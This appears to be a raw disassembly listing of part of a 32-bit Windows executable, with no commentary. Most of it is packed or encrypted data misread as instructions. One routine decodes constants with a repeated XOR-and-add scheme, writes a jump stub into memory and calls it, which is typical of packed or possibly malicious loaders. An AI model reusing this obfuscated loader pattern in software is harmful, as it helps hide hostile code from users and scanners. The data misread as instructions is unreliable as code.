  42f8d0:	loopne 0x42f8c2
  42f8d2:	lods   al,BYTE PTR ds:[esi]
  42f8d3:	out    dx,eax
  42f8d4:	mov    dh,0xe6
  42f8d6:	jmp    0x42f88b
  42f8d8:	clc    
  42f8d9:	repz mov al,0xeb
  42f8dc:	mov    dl,0xf6
  42f8de:	aam    0xf5
  42f8e0:	int    0x7
  42f8e2:	add    edi,ecx
  42f8e4:	lock push es
  42f8e6:	(bad)  
  42f8e7:	cmc    
  42f8e8:	rol    BYTE PTR [eax],0xf8
  42f8eb:	into   
  42f8ec:	enter  0xcbec,0xcb
  42f8f0:	mov    dl,0xf1
  42f8f2:	mov    cl,0xbc
  42f8f4:	(bad)  
  42f8f5:	mov    ch,0xc8
  42f8f7:	scas   eax,DWORD PTR es:[edi]
  42f8f8:	mov    bh,0xfb
  42f8fa:	fucomi st,st(6)
  42f8fc:	mov    dl,0xfc
  42f8fe:	(bad)  
  42f8ff:	fdivr  st(6),st
  42f901:	cmc    
  42f902:	repz aad 0xc3
  42f905:	fcmovnb st,st(6)
  42f907:	sti    
  42f908:	add    DWORD PTR [esi],ecx
  42f90a:	or     ebx,ebx
  42f90c:	fsubr  st,st(7)
  42f90e:	int    0xa7
  42f910:	mov    edi,0xe6f4e3d6
  42f915:	(bad)
  42f918:	retf   0xdad7
  42f91b:	std    
  42f91c:	mov    ebp,0xf40101dc
  42f921:	(bad)  
  42f923:	mov    ebx,0xf502f3fb
  42f928:	(bad)  
  42f929:	jmp    0xe129d1f6
  42f92e:	adc    ebp,DWORD PTR [ebx-0xc223a22]
  42f934:	into   
  42f935:	shl    BYTE PTR [esp+esi*8-0xd151930],0xff
  42f93d:	sar    DWORD PTR [edi-0x192a2c0d],1
  42f943:	in     al,0xe6
  42f945:	fadd   st,st(0)
  42f947:	jmp    0xeb05:0xfeebe60a
  42f94e:	retf   
  42f94f:	mov    ebp,0xb0ead7dc
  42f954:	out    0xe6,al
  42f956:	into   
  42f957:	stc    
  42f958:	in     al,dx
  42f959:	into   
  42f95a:	in     al,dx
  42f95b:	fsincos 
  42f95d:	repnz shl bl,1
  42f960:	int    0xd7
  42f962:	out    dx,al
  42f963:	add    al,ch
  42f965:	shl    al,0xdb
  42f968:	add    eax,0xfa08ff06
  42f96d:	lds    ecx,FWORD PTR [esi]
  42f96f:	out    0xd1,al
  42f971:	shl    esi,0xd1
  42f974:	loop   0x42f956
  42f976:	mov    edx,0xd6ecb2b3
  42f97b:	test   edx,0xcdd3e8d8
  42f981:	mov    ebp,0xdedce7db
  42f986:	out    0xe3,al
  42f988:	loope  0x42f990
  42f98a:	(bad)  
  42f98b:	jmp    0xadd3:0xcaf1df13
  42f992:	mov    cl,0xcb
  42f994:	loop   0x42f968
  42f996:	loop   0x42f94f
  42f998:	clc    
  42f999:	jmp    0xd013cf89
  42f99e:	lock out dx,eax
  42f9a0:	add    dh,dh
  42f9a2:	mov    esi,0xc2f105e6
  42f9a7:	call   0xee32b78d
  42f9ac:	into   
  42f9ad:	(bad)  
  42f9ae:	adc    bl,ch
  42f9b0:	mov    esi,0xe5f0f0ca
  42f9b5:	in     al,dx
  42f9b6:	lods   al,BYTE PTR ds:[esi]
  42f9b7:	int    0xdf
  42f9b9:	mov    ebx,0xcdf5ecd7
  42f9be:	in     eax,dx
  42f9bf:	sar    ebp,cl
  42f9c1:	rol    DWORD PTR [edi],cl
  42f9c3:	repnz out 0xda,al
  42f9c6:	fyl2x  
  42f9c8:	inc    BYTE PTR [eax]
  42f9ca:	call   0xd922c6d2
  42f9cf:	test   al,0xca
  42f9d1:	shr    BYTE PTR [edi-0x293f3f31],1
  42f9d7:	fxch   st(2)
  42f9d9:	stc    
  42f9da:	retf   0xf0f4
  42f9dd:	stc    
  42f9de:	int    0xcc
  42f9e0:	shl    esi,0xbc
  42f9e3:	vpaddusb ymm0,ymm1,ymm6
  42f9e7:	fucomp st(3)
  42f9e9:	loopne 0x42f9ab
  42f9eb:	aad    0x2
  42f9ed:	out    dx,al
  42f9ee:	add    al,0xee
  42f9f0:	shl    eax,1
  42f9f2:	icebp  
  42f9f3:	xlat   BYTE PTR ds:[ebx]
  42f9f4:	lods   al,BYTE PTR ds:[esi]
  42f9f5:	jmp    0x42f9ac
  42f9f7:	(bad)  
  42f9f8:	retf   
  42f9f9:	out    dx,al
  42f9fa:	rcr    cl,1
  42f9fc:	mov    dh,0xb1
  42f9fe:	mov    ebx,0xc7d7ecf7
  42fa03:	cld    
  42fa04:	(bad)  
  42fa05:	out    0xe2,eax
  42fa07:	push   es
  42fa08:	jecxz  0x42fa0e
  42fa0a:	retf   
  42fa0b:	jmp    0xb1d7:0xadc8fae3
  42fa12:	(bad)  
  42fa13:	retf   0xdbf7
  42fa16:	mov    ebx,0xb5f1e0ec
  42fa1b:	repnz cld 
  42fa1d:	lock fcmovnbe st,st(4)
  42fa20:	(bad)  
  42fa21:	out    dx,eax
  42fa22:	int    0xfb
  42fa24:	(bad)  
  42fa27:	fcmovu st,st(1)
  42fa29:	(bad)  
  42fa2b:	push   cs
  42fa2c:	add    al,0xfc
  42fa2e:	adc    al,dh
  42fa30:	in     al,0xb3
  42fa32:	enter  0xcac4,0xc1
  42fa36:	jmp    0xbfdb:0xf7ccbad4
  42fa3d:	shr    ecx,cl
  42fa3f:	stc    
  42fa40:	into   
  42fa41:	rcr    ch,cl
  42fa43:	fcomp  st(7)
  42fa45:	(bad)  
  42fa46:	aad    0xfe
  42fa48:	fld    DWORD PTR [ecx+eax*1]
  42fa4b:	fcmovb st,st(6)
  42fa4d:	push   cs
  42fa4e:	or     eax,ecx
  42fa50:	mov    dl,0xdf
  42fa52:	mov    bh,0xe8
  42fa54:	repnz jecxz 0x42fa17
  42fa57:	aad    0xd7
  42fa59:	enter  0xfae9,0xb4
  42fa5d:	(bad)  
  42fa5f:	aam    0xed
  42fa61:	loope  0x42fa36
  42fa63:	mov    edi,0xcadad8f5
  42fa68:	(bad)  
  42fa69:	jecxz  0x42fa2b
  42fa6b:	or     eax,esi
  42fa6d:	fild   WORD PTR [esi]
  42fa6f:	lods   eax,DWORD PTR ds:[esi]
  42fa70:	int    0xcc
  42fa72:	fucom  st(5)
  42fa74:	jmp    0xd70dd240
  42fa79:	mov    edx,0xbcf6cacb
  42fa7e:	loope  0x42fa39
  42fa80:	sti    
  42fa81:	mov    esi,0xe6c7e0f6
  42fa86:	rol    DWORD PTR [edx],0xf7
  42fa89:	loop   0x42fa91
  42fa8b:	fmulp  st(2),st
  42fa8d:	adc    dl,bl
  42fa8f:	mov    dl,0xc6
  42fa91:	loop   0x42fa37
  42fa93:	cmc    
  42fa94:	stos   BYTE PTR es:[edi],al
  42fa95:	(bad)  
  42fa96:	out    0xc9,al
  42fa98:	jmp    0x42fa8d
  42fa9a:	(bad)  
  42fa9b:	mov    ebx,0xd4f1ccfd
  42faa0:	rcr    bh,1
  42faa2:	in     eax,0xd3
  42faa4:	(bad)  
  42faa5:	loop   0x42fa80
  42faa7:	or     edx,esp
  42faa9:	add    eax,ecx
  42faab:	fdivp  st(1),st
  42faad:	or     ch,ah
  42faaf:	(bad)  
  42fab0:	loopne 0x42fa65
  42fab2:	cmc    
  42fab3:	jmp    0x42fa88
  42fab5:	jecxz  0x42fa7c
  42fab7:	int    0xd6
  42fab9:	iret   
  42faba:	shl    DWORD PTR [edi-0x1c4b3216],cl
  42fac0:	std    
  42fac1:	push   es
  42fac2:	test   BYTE PTR ds:0xc402f5c3,0xd8
  42fac9:	loope  0x42faa6
  42facb:	out    dx,eax
  42facc:	sti    
  42facd:	iret   
  42face:	or     ebp,ecx
  42fad0:	scas   eax,DWORD PTR es:[edi]
  42fad1:	loope  0x42fa8f
  42fad3:	retf   
  42fad4:	ror    ah,cl
  42fad6:	mov    ch,0xaf
  42fad8:	int3   
  42fad9:	fmul   st,st(0)
  42fadb:	xlat   BYTE PTR ds:[ebx]
  42fadc:	mov    ecx,0xe0ccffbf
  42fae1:	(bad)  
  42fae2:	cmc    
  42fae3:	repz ret 
  42fae5:	mov    esp,0xac6e2f2
  42faea:	(bad)  
  42faec:	jmp    0xeec8:0xaaea01e4
  42faf3:	hlt    
  42faf4:	lods   al,BYTE PTR ds:[esi]
  42faf5:	shr    ebx,1
  42faf7:	aad    0xf9
  42faf9:	into   
  42fafa:	into   
  42fafb:	(bad)  
  42fafc:	leave  
  42fafd:	mov    ah,0xd3
  42faff:	not    eax
  42fb01:	out    0xc7,eax
  42fb03:	clc    
  42fb04:	(bad)
  42fb08:	lock call 0xe21d01ee
  42fb0e:	psrad  mm0,mm1
  42fb11:	mov    bh,0xce
  42fb13:	ret    0xecd4
  42fb16:	ror    bh,0xeb
  42fb19:	jmp    0xca13b40a
  42fb1e:	sar    DWORD PTR [eax-0x39021e1d],1
  42fb24:	repz repnz (bad) 
  42fb27:	cld    
  42fb28:	aam    0xe5
  42fb2a:	cmc    
  42fb2b:	syscall 
  42fb2d:	(bad)
  42fb30:	icebp  
  42fb31:	imul   esi
  42fb33:	into   
  42fb34:	in     al,dx
  42fb35:	cmc    
  42fb36:	call   0xb913b432
  42fb3b:	leave  
  42fb3c:	repz clc 
  42fb3e:	mov    ecx,0xd9b5f5da
  42fb43:	pop    es
  42fb44:	jecxz  0x42fb46
  42fb46:	fld    DWORD PTR [edx+ebx*8]
  42fb49:	jmp    0x42fb13
  42fb4b:	(bad)  
  42fb4c:	sti    
  42fb4d:	in     al,dx
  42fb4e:	(bad)  
  42fb4f:	fdiv   QWORD PTR [ebx-0x344d1a2f]
  42fb55:	fcmovnbe st,st(2)
  42fb57:	rol    esp,0xea
  42fb5a:	enter  0xf4b7,0xb1
  42fb5e:	test   bh,0xf1
  42fb61:	cmc    
  42fb62:	mov    eax,0xfb03c101
  42fb67:	aad    0x2
  42fb69:	add    al,0xc4
  42fb6b:	stc    
  42fb6c:	into   
  42fb6d:	add    al,0xec
  42fb6f:	shr    al,1
  42fb71:	shl    edi,cl
  42fb73:	in     al,0xd5
  42fb75:	shl    dh,1
  42fb77:	cmc    
  42fb78:	div    dl
  42fb7a:	mov    dh,0xe8
  42fb7c:	mov    ch,0xd5
  42fb7e:	aad    0xec
  42fb80:	iret   
  42fb81:	(bad)  
  42fb82:	in     al,dx
  42fb83:	loope  0x42fb61
  42fb85:	push   es
  42fb86:	std    
  42fb87:	neg    ebp
  42fb89:	add    al,0xc4
  42fb8b:	(bad)  
  42fb8d:	loope  0x42fb82
  42fb8f:	retf   
  42fb90:	lock mov bh,0xcd
  42fb93:	int    0xdc
  42fb95:	jecxz  0x42fb8d
  42fb97:	call   0xf640b264
  42fb9c:	jmp    0xbcd7:0x2ceed02
  42fba3:	xlat   BYTE PTR ds:[ebx]
  42fba4:	add    ecx,ebx
  42fba6:	inc    al
  42fba8:	jecxz  0x42fb8a
  42fbaa:	or     ecx,esp
  42fbac:	loopne 0x42fbb3
  42fbae:	push   cs
  42fbaf:	in     al,0xe6
  42fbb1:	mov    bh,0xd1
  42fbb3:	retf   
  42fbb4:	(bad)  
  42fbb6:	ror    DWORD PTR [ebx+0x189cc4d],cl
  42fbbc:	lea    eax,[ebp-0x20]
  42fbbf:	mov    DWORD PTR [ebp-0x1c],eax
  42fbc2:	mov    eax,DWORD PTR [ebp-0x1c]
  42fbc5:	mov    eax,DWORD PTR [eax]
  42fbc7:	mov    ecx,DWORD PTR [ebp-0x20]
  42fbca:	sub    eax,ecx
  42fbcc:	mov    ecx,DWORD PTR [ebp-0x1c]
  42fbcf:	mov    DWORD PTR [ecx],eax
  42fbd1:	mov    eax,DWORD PTR [ebp-0x38]
  42fbd4:	xor    eax,0x75108b5
  42fbd9:	add    eax,0x3272fb
  42fbde:	mov    ecx,DWORD PTR [ebp-0x1c]
  42fbe1:	mov    ecx,DWORD PTR [ecx]
  42fbe3:	or     ecx,eax
  42fbe5:	mov    eax,DWORD PTR [ebp-0x1c]
  42fbe8:	mov    DWORD PTR [eax],ecx
  42fbea:	lea    eax,[ebp-0x30]
  42fbed:	mov    DWORD PTR [ebp-0x94],eax
  42fbf3:	mov    eax,DWORD PTR [ebp-0x94]
  42fbf9:	mov    eax,DWORD PTR [eax]
  42fbfb:	mov    ecx,DWORD PTR [ebp-0x30]
  42fbfe:	sub    eax,ecx
  42fc00:	mov    ecx,DWORD PTR [ebp-0x94]
  42fc06:	mov    DWORD PTR [ecx],eax
  42fc08:	mov    eax,DWORD PTR [ebp-0x94]
  42fc0e:	mov    eax,DWORD PTR [eax]
  42fc10:	or     eax,0xf89c85bf
  42fc15:	mov    ecx,DWORD PTR [ebp-0x94]
  42fc1b:	mov    DWORD PTR [ecx],eax
  42fc1d:	mov    eax,DWORD PTR [ebp-0x10]
  42fc20:	xor    eax,0x75108b5
  42fc25:	add    eax,0x3272fb
  42fc2a:	push   eax
  42fc2b:	mov    eax,DWORD PTR [ebp-0x4]
  42fc2e:	xor    eax,0x75108b5
  42fc33:	add    eax,0x3272fb
  42fc38:	push   eax
  42fc39:	mov    eax,DWORD PTR [ebp-0x30]
  42fc3c:	xor    eax,0x75108b5
  42fc41:	add    eax,0x3272ff
  42fc46:	push   eax
  42fc47:	lea    eax,[ebp-0x88]
  42fc4d:	push   eax
  42fc4e:	push   DWORD PTR [ebp-0x38]
  42fc51:	push   DWORD PTR [ebp-0x90]
  42fc57:	call   0x415490
  42fc5c:	test   eax,eax
  42fc5e:	je     0x42fc98
  42fc64:	lea    eax,[ebp-0x88]
  42fc6a:	push   eax
  42fc6b:	mov    eax,DWORD PTR [ebp-0x90]
  42fc71:	xor    eax,0x75108b5
  42fc76:	add    eax,0x3272fb
  42fc7b:	push   eax
  42fc7c:	mov    eax,DWORD PTR [ebp-0x2c]
  42fc7f:	add    eax,0xaa
  42fc84:	push   eax
  42fc85:	mov    eax,DWORD PTR [ebp-0x2c]
  42fc88:	mov    eax,DWORD PTR [eax+0x198]
  42fc8e:	push   DWORD PTR [eax]
  42fc90:	call   0x40d347
  42fc95:	mov    DWORD PTR [ebp-0xc],eax
  42fc98:	lea    eax,[ebp+0x4]
  42fc9b:	mov    ecx,DWORD PTR ds:0x437497
  42fca1:	mov    DWORD PTR [ecx*4+0x43748f],eax
  42fca8:	mov    eax,ds:0x437497
  42fcad:	inc    eax
  42fcae:	mov    ds:0x437497,eax
  42fcb3:	mov    eax,DWORD PTR [ebp-0xc]
  42fcb6:	sub    eax,0x3272fb
  42fcbb:	xor    eax,0x75108b5
  42fcc0:	cmp    eax,0xf89c85b0
  42fcc5:	jne    0x42fcd5
  42fccb:	jmp    0x42fd86
  42fcd0:	jmp    0x42fd86
  42fcd5:	lea    eax,[ebp-0x9c]
  42fcdb:	mov    DWORD PTR [ebp-0x98],eax
  42fce1:	lea    eax,[ebp-0x98]
  42fce7:	mov    DWORD PTR [ebp-0xa0],eax
  42fced:	mov    eax,DWORD PTR [ebp-0x3c]
  42fcf0:	mov    ecx,DWORD PTR [ebp-0xa0]
  42fcf6:	mov    ecx,DWORD PTR [ecx]
  42fcf8:	mov    DWORD PTR [ecx],eax
  42fcfa:	mov    eax,DWORD PTR [ebp-0xc]
  42fcfd:	mov    ecx,DWORD PTR [ebp-0x98]
  42fd03:	mov    ecx,DWORD PTR [ecx]
  42fd05:	sub    ecx,eax
  42fd07:	mov    eax,DWORD PTR [ebp-0x98]
  42fd0d:	mov    DWORD PTR [eax],ecx
  42fd0f:	mov    eax,DWORD PTR [ebp-0xa0]
  42fd15:	mov    eax,DWORD PTR [eax]
  42fd17:	mov    ecx,DWORD PTR [ebp-0x30]
  42fd1a:	xor    ecx,0x75108b5
  42fd20:	add    ecx,0x3272fb
  42fd26:	mov    eax,DWORD PTR [eax]
  42fd28:	sub    eax,ecx
  42fd2a:	mov    ecx,DWORD PTR [ebp-0xa0]
  42fd30:	mov    ecx,DWORD PTR [ecx]
  42fd32:	mov    DWORD PTR [ecx],eax
  42fd34:	mov    eax,DWORD PTR [ebp-0xc]
  42fd37:	mov    DWORD PTR [eax],0x657664e9
  42fd3d:	mov    DWORD PTR [eax+0x4],0x86787677
  42fd44:	mov    eax,DWORD PTR [ebp-0xa0]
  42fd4a:	mov    eax,DWORD PTR [eax]
  42fd4c:	mov    eax,DWORD PTR [eax]
  42fd4e:	mov    ecx,DWORD PTR [ebp-0xc]
  42fd51:	mov    DWORD PTR [ecx+0x1],eax
  42fd54:	push   DWORD PTR [ebp-0x2c]
  42fd57:	mov    eax,ds:0x437463
  42fd5c:	mov    eax,DWORD PTR [eax]
  42fd5e:	push   DWORD PTR [eax]
  42fd60:	push   DWORD PTR ds:0x43747f
  42fd66:	push   DWORD PTR ds:0x437223
  42fd6c:	push   DWORD PTR ds:0x43745f
  42fd72:	push   DWORD PTR ds:0x437503
  42fd78:	push   DWORD PTR [ebp-0x90]
  42fd7e:	push   DWORD PTR [ebp-0x38]
  42fd81:	mov    eax,DWORD PTR [ebp-0xc]
  42fd84:	call   eax
  42fd86:	leave  
  42fd87:	ret    0x10
	...
  42fd92:	add    BYTE PTR [eax],al
  42fd94:	pop    ds
  42fd95:	or     al,0xaa
  42fd97:	dec    ebp
  42fd98:	add    BYTE PTR [eax],al
  42fd9a:	add    BYTE PTR [eax],al
  42fd9c:	add    al,BYTE PTR [eax]
  42fd9e:	add    BYTE PTR [eax],al
  42fda0:	cmp    eax,0xb0000000
  42fda5:	std    
  42fda6:	add    al,BYTE PTR [eax]
  42fda8:	mov    al,0xf1
  42fdaa:	add    al,BYTE PTR [eax]
  42fdac:	add    BYTE PTR [eax],al
  42fdae:	add    BYTE PTR [eax],al
  42fdb0:	push   edx
  42fdb1:	push   ebx
  42fdb2:	inc    esp
  42fdb3:	push   ebx
  42fdb4:	das    
  42fdb5:	ja     0x42fd9a
  42fdb7:	aad    0xf2
  42fdb9:	js     0x42fd9d
  42fdbb:	dec    ecx
  42fdbc:	test   DWORD PTR [ecx-0x726028cc],edx
  42fdc2:	stc    
  42fdc3:	jnp    0x42fdc6
  42fdc5:	add    BYTE PTR [eax],al
  42fdc7:	add    BYTE PTR [ebp+0x3a],al
  42fdca:	pop    esp
  42fdcb:	dec    esp
  42fdcc:	outs   dx,DWORD PTR ds:[esi]
  42fdcd:	jae    0x42fe43
  42fdcf:	and    BYTE PTR [esi+0x6f],al
  42fdd2:	ins    BYTE PTR es:[edi],dx
  42fdd3:	fs gs jb 0x42fdf7
  42fdd7:	dec    ecx
  42fdd8:	outs   dx,BYTE PTR ds:[esi]
  42fdd9:	outs   dx,WORD PTR ds:[esi]
  42fddb:	pop    esp
  42fddc:	push   eax
  42fddd:	jb     0x42fe4e
  42fddf:	push   0x46
  42fde1:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x44656d61
  42fde9:	popa   
  42fdea:	je     0x42fe4d
	...
  42fdf4:	pop    ds
  42fdf5:	or     al,0xaa
  42fdf7:	dec    ebp
  42fdf8:	add    BYTE PTR [eax],al
  42fdfa:	add    BYTE PTR [eax],al
  42fdfc:	and    bh,dh
  42fdfe:	add    al,BYTE PTR [eax]
  42fe00:	add    DWORD PTR [eax],eax
  42fe02:	add    BYTE PTR [eax],al
  42fe04:	add    DWORD PTR [eax],eax
  42fe06:	add    BYTE PTR [eax],al
  42fe08:	add    DWORD PTR [eax],eax
  42fe0a:	add    BYTE PTR [eax],al
  42fe0c:	sbb    dh,bh
  42fe0e:	add    al,BYTE PTR [eax]
  42fe10:	sbb    al,0xfe
  42fe12:	add    al,BYTE PTR [eax]
  42fe14:	and    dh,bh
  42fe16:	add    al,BYTE PTR [eax]
  42fe18:	mov    ds:0x3200001a,eax
  42fe1d:	inc    BYTE PTR [edx]
  42fe1f:	add    BYTE PTR [eax],al
  42fe21:	add    BYTE PTR [ebx+0x65],dl
  42fe24:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  42fe28:	outs   dx,BYTE PTR ds:[esi]
  42fe29:	inc    esp
  42fe2a:	popa   
  42fe2b:	je     0x42fe8e
  42fe2d:	pop    edi
  42fe2e:	inc    ebp
  42fe2f:	js     0x42fea1
  42fe31:	add    BYTE PTR [edi+0x49],bl
  42fe34:	jae    0x42fe8d
  42fe36:	outs   dx,DWORD PTR ds:[esi]
  42fe37:	ja     0x42fe6f
  42fe39:	xor    al,0x4d
  42fe3b:	gs jae 0x42feb1
  42fe3e:	popa   
  42fe3f:	addr16 gs dec ecx
  42fe42:	jae    0x42fe9b
  42fe44:	outs   dx,DWORD PTR ds:[esi]
  42fe45:	ja     0x42fe7d
  42fe47:	xor    al,0x4d
  42fe49:	gs jae 0x42febf
  42fe4c:	popa   
  42fe4d:	addr16 gs inc eax
  42fe50:	xor    BYTE PTR [eax],al
  42fe52:	or     eax,0xc9c964a5
  42fe57:	adc    esi,DWORD PTR [ebp+0x55]
  42fe5a:	pop    ss
  42fe5b:	jne    0x42fec6
  42fe5d:	or     eax,0x61216975
  42fe62:	icebp  
  42fe63:	xchg   edi,eax
  42fe64:	or     eax,0x55ead669
  42fe69:	icebp  
  42fe6a:	xchg   edi,eax
  42fe6b:	or     eax,0xd6bb269
  42fe70:	jne    0x42fe04
  42fe72:	jmp    DWORD PTR [edx+0x750dfa91]
  42fe78:	xchg   bh,bh
  42fe7a:	mov    ds:0x750dfd3a,al
  42fe7f:	xchg   edx,eax
  42fe80:	jmp    DWORD PTR [edx+0x750df33b]
  42fe86:	xchg   edx,eax
  42fe87:	jmp    DWORD PTR [edx+0x22574956]
  42fe8d:	xchg   BYTE PTR [ecx-0x5b],ah
  42fe90:	or     eax,0xd264d664
  42fe95:	pop    edi
  42fe96:	popa   
  42fe97:	popa   
  42fe98:	(bad)  
  42fe99:	jmp    0xb269:0x1e2ad9a
  42fea0:	xchg   ecx,eax
  42fea1:	(bad)  
  42fea2:	jmp    0xe769:0x1e22586
  42fea9:	xor    al,0xf0
  42feab:	mov    cl,0x8d
  42fead:	popa   
  42feae:	popa   
  42feaf:	or     eax,0xe2178e75
  42feb4:	out    0x62,eax
  42feb6:	bound  esp,QWORD PTR [edx+0x14]
  42feb9:	(bad)  
  42febb:	popa   
  42febc:	popa   
  42febd:	xchg   esp,eax
  42febe:	pop    ss
  42febf:	loop   0x42fe5b
  42fec1:	bound  esp,QWORD PTR [edx+0x62]
  42fec4:	adc    al,0x34
  42fec6:	int3   
  42fec7:	popa   
  42fec8:	popa   
  42fec9:	xchg   esp,eax
  42feca:	pop    ss
  42fecb:	loop   0x42fe5d
  42fecd:	bound  esp,QWORD PTR [edx+0x62]
  42fed0:	adc    al,0xdd
  42fed2:	int3   
  42fed3:	popa   
  42fed4:	popa   
  42fed5:	xchg   esp,eax
  42fed6:	pop    ss
  42fed7:	loop   0x42fe5f
  42fed9:	bound  esp,QWORD PTR [edx+0x62]
  42fedc:	adc    al,0xaa
  42fede:	int3   
  42fedf:	popa   
  42fee0:	popa   
  42fee1:	xchg   esp,eax
  42fee2:	pop    ss
  42fee3:	loop   0x42fe71
  42fee5:	bound  esp,QWORD PTR [edx+0x62]
  42fee8:	adc    al,0x7a
  42feea:	int3   
  42feeb:	popa   
  42feec:	popa   
  42feed:	xchg   esp,eax
  42feee:	pop    ss
  42feef:	loop   0x42fe83
  42fef1:	bound  esp,QWORD PTR [edx+0x62]
  42fef4:	adc    al,0xab
  42fef6:	int3   
  42fef7:	popa   
  42fef8:	popa   
  42fef9:	xchg   esp,eax
  42fefa:	pop    ss
  42fefb:	loop   0x42fe85
  42fefd:	bound  esp,QWORD PTR [edx+0x62]
  42ff00:	adc    al,0x17
  42ff02:	shl    DWORD PTR [ecx+0x61],cl
  42ff05:	xchg   esp,eax
  42ff06:	pop    ss
  42ff07:	loop   0x42ff87
  42ff09:	bound  esp,QWORD PTR [edx+0x62]
  42ff0c:	adc    al,0x9e
  42ff0e:	int3   
  42ff0f:	popa   
  42ff10:	popa   
  42ff11:	xchg   esp,eax
  42ff12:	pop    ss
  42ff13:	loop   0x42ff7f
  42ff15:	bound  esp,QWORD PTR [edx+0x62]
  42ff18:	adc    al,0xd
  42ff1a:	shl    DWORD PTR [ecx+0x61],cl
  42ff1d:	xchg   esp,eax
  42ff1e:	pop    ss
  42ff1f:	loop   0x42feab
  42ff21:	bound  esp,QWORD PTR [edx+0x62]
  42ff24:	adc    al,0x85
  42ff26:	int3   
  42ff27:	popa   
  42ff28:	popa   
  42ff29:	xchg   esp,eax
  42ff2a:	pop    ss
  42ff2b:	loop   0x42fead
  42ff2d:	bound  esp,QWORD PTR [edx+0x62]
  42ff30:	adc    al,0x34
  42ff32:	int3   
  42ff33:	popa   
  42ff34:	popa   
  42ff35:	xchg   esp,eax
  42ff36:	pop    ss
  42ff37:	loop   0x42ffaf
  42ff39:	bound  esp,QWORD PTR [edx+0x62]
  42ff3c:	adc    al,0x32
  42ff3e:	int3   
  42ff3f:	popa   
  42ff40:	popa   
  42ff41:	xchg   esp,eax
  42ff42:	pop    ss
  42ff43:	loop   0x42ffc1
  42ff45:	bound  esp,QWORD PTR [edx+0x62]
  42ff48:	adc    al,0xd1
  42ff4a:	jno    0x42ffad
  42ff4c:	popa   
  42ff4d:	xchg   esp,eax
  42ff4e:	pop    ss
  42ff4f:	loop   0x42ff4c
  42ff51:	bound  esp,QWORD PTR [edx+0x62]
  42ff54:	adc    al,0xb1
  42ff56:	and    BYTE PTR [ecx+0x61],0x94
  42ff5a:	pop    ss
  42ff5b:	loop   0x42ffd5
  42ff5d:	bound  esp,QWORD PTR [edx+0x62]
  42ff60:	adc    al,0xac
  42ff62:	cmp    esp,DWORD PTR [ecx+0x61]
  42ff65:	xchg   esp,eax
  42ff66:	pop    ss
  42ff67:	loop   0x42fef7
  42ff69:	bound  esp,QWORD PTR [edx+0x62]
  42ff6c:	adc    al,0x77
  42ff6e:	fbld   TBYTE PTR [ecx+0x61]
  42ff71:	xchg   esp,eax
  42ff72:	pop    ss
  42ff73:	loop   0x42ff49
  42ff75:	bound  esp,QWORD PTR [edx+0x62]
  42ff78:	adc    al,0xa3
  42ff7a:	int3   
  42ff7b:	popa   
  42ff7c:	popa   
  42ff7d:	xchg   esp,eax
  42ff7e:	pop    ss
  42ff7f:	loop   0x42ffb9
  42ff81:	bound  esp,QWORD PTR [edx+0x62]
  42ff84:	adc    al,0xe6
  42ff86:	int3   
  42ff87:	popa   
  42ff88:	popa   
  42ff89:	xchg   esp,eax
  42ff8a:	pop    ss
  42ff8b:	loop   0x42ff5f
  42ff8d:	bound  esp,QWORD PTR [edx+0x62]
  42ff90:	adc    al,0x34
  42ff92:	int3   
  42ff93:	popa   
  42ff94:	popa   
  42ff95:	xchg   esp,eax
  42ff96:	pop    ss
  42ff97:	loop   0x42ff61
  42ff99:	bound  esp,QWORD PTR [edx+0x62]
  42ff9c:	adc    al,0xe3
  42ff9e:	int3   
  42ff9f:	popa   
  42ffa0:	popa   
  42ffa1:	xchg   esp,eax
  42ffa2:	pop    ss
  42ffa3:	loop   0x42ff63
  42ffa5:	bound  esp,QWORD PTR [edx+0x62]
  42ffa8:	adc    al,0xa1
  42ffaa:	int3   
  42ffab:	popa   
  42ffac:	popa   
  42ffad:	xchg   esp,eax
  42ffae:	pop    ss
  42ffaf:	loop   0x42ff55
  42ffb1:	bound  esp,QWORD PTR [edx+0x62]
  42ffb4:	adc    al,0xe5
  42ffb6:	int3   
  42ffb7:	popa   
  42ffb8:	popa   
  42ffb9:	xchg   esp,eax
  42ffba:	pop    ss
  42ffbb:	loop   0x42ff87
  42ffbd:	bound  esp,QWORD PTR [edx+0x62]
  42ffc0:	adc    al,0x9d
  42ffc2:	int3   
  42ffc3:	popa   
  42ffc4:	popa   
  42ffc5:	xchg   esp,eax
  42ffc6:	pop    ss
  42ffc7:	loop   0x42ff89
  42ffc9:	bound  esp,QWORD PTR [edx+0x62]
  42ffcc:	adc    al,0xc5
  42ffce:	int3   
  42ffcf:	popa   
  42ffd0:	popa   
  42ffd1:	xchg   esp,eax
  42ffd2:	pop    ss
  42ffd3:	loop   0x42ff8b
  42ffd5:	bound  esp,QWORD PTR [edx+0x62]
  42ffd8:	adc    al,0xaf
  42ffda:	int3   
  42ffdb:	popa   
  42ffdc:	popa   
  42ffdd:	xchg   esp,eax
  42ffde:	pop    ss
  42ffdf:	loop   0x42ff9d
  42ffe1:	bound  esp,QWORD PTR [edx+0x62]
  42ffe4:	adc    al,0xe0
  42ffe6:	int3   
  42ffe7:	popa   
  42ffe8:	popa   
  42ffe9:	xchg   esp,eax
  42ffea:	pop    ss
  42ffeb:	loop   0x43002d
  42ffed:	bound  esp,QWORD PTR [edx+0x62]
  42fff0:	adc    al,0x9e
  42fff2:	int3   
  42fff3:	popa   
  42fff4:	popa   
  42fff5:	xchg   esp,eax
  42fff6:	pop    ss
  42fff7:	loop   0x42ffb1
  42fff9:	bound  esp,QWORD PTR [edx+0x62]
  42fffc:	adc    al,0x34
  42fffe:	int3   
  42ffff:	popa   
  430000:	popa   
  430001:	xchg   esp,eax
  430002:	pop    ss
  430003:	loop   0x42ffd3
  430005:	bound  esp,QWORD PTR [edx+0x62]
  430008:	adc    al,0x38
  43000a:	int3   
  43000b:	popa   
  43000c:	popa   
  43000d:	xchg   esp,eax
  43000e:	pop    ss
  43000f:	loop   0x42ffa5
  430011:	bound  esp,QWORD PTR [edx+0x62]
  430014:	adc    al,0xcc
  430016:	inc    ebp
  430017:	popa   
  430018:	popa   
  430019:	xchg   esp,eax
  43001a:	pop    ss
  43001b:	loop   0x430097
  43001d:	bound  esp,QWORD PTR [edx+0x62]
  430020:	adc    al,0xd3
  430022:	es popa 
  430024:	popa   
  430025:	xchg   esp,eax
  430026:	pop    ss
  430027:	loop   0x430099
  430029:	bound  esp,QWORD PTR [edx+0x62]
  43002c:	adc    al,0xdc
  43002e:	dec    eax
  43002f:	popa   
  430030:	popa   
